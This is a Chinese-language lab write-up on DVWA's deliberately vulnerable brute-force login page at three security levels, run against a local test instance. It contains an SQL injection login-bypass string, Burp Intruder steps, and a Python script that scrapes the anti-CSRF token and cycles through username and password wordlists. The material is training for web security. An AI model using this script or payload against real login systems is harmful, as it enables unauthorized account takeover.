<center>Brute Force</center>





[toc]









## Brute Force

> 暴力破解







### 1. low

> 低级

> 看代码 [url](http://192.168.0.111:8000/vulnerabilities/view_source.php?id=brute&security=low)

```shell
# docker
docker exec -it dvwa bash

# 进入目录 
cd /var/www/html

# 查看源码
```

> sql注入问题：

```shell
# sql 语句
SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';

# admin' or '1'='1
SELECT * FROM `users` WHERE user = admin' or '1'='1 AND password = '$pass'
```





### 2. medium

> 中级
>
> 源码：[url](http://192.168.0.111:8000/vulnerabilities/view_source.php?id=brute&security=medium)

mysqli_real_escape_string [菜鸟](https://www.runoob.com/php/func-mysqli-real-escape-string.html)

多了这个过滤方法： 

```shell
转义特殊字符： 编码的字符是 NUL（ASCII 0）、\n、\r、\、'、" 和 Control-Z。
```

> 开始暴力破解：brup抓包。

```shell
1. proxy 抓包

2. 发送到intruder

3. 对密码进行爆破，看length。 不一样内个可能就是密码
```





### 3. high

> 高级
>
> 源码：[url](http://192.168.0.111:8000/vulnerabilities/view_source.php?id=brute&security=high)

```shell
# token 校验
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
```

> 服务端返回一个token给客户端，客户端隐藏的`input`提交给客户端校验

```html
<input type='hidden' name='user_token' value='42f15b92219b40fc0aa2f1f8215fdf56' />
```

```python
# 脚本爆破
from bs4 import BeautifulSoup
import requests


header = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Cookie": "PHPSESSID=5skbhhtisu1kf4vfe8jvh4a2l5; security=high"
}


url = "http://192.168.0.111:8000/vulnerabilities/brute/"


def get_token(url, headers):
    response = requests.get(url, headers=headers)
    html = response.content.decode("utf-8")
    soup = BeautifulSoup(html, "html.parser")
    user_token = soup.find("input", {"name": "user_token"})["value"]
    return user_token



i = 0
for admin in open("admin.txt", "r"):
    for password in open("password.txt", "r"):
        user_token = get_token(url, header)
        #  payload
        data = {
            "username": admin.strip(),
            "password": password.strip(),
            "Login": "Login",
            "user_token": user_token
        }
        i = i + 1
        response = requests.get(url, params=data, headers=header)
        print(f"[{i}] {admin.strip()}:{password.strip()},{len(response.content)}")

```

